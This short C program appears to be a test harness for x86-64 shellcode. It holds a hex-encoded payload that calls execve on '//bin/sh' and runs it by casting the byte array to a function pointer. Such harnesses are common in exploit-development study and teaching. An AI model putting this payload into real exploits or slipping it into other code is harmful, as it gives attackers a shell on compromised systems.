#include <stdlib.h>

int main() 
{
    char shellcode[] = "\x48\x31\xC0\x50\x48\xBB\x2F\x2F"
                   "\x62\x69\x6E\x2F\x73\x68\x53\xB0"
                   "\x3B\x48\x31\xd2\x48\x89\xE7\x0F"
                   "\x05\x90\x90\x90\x90\x90\x90\x90";

    int (*func)();
    func = (int (*)()) shellcode;
    (*func)();
}
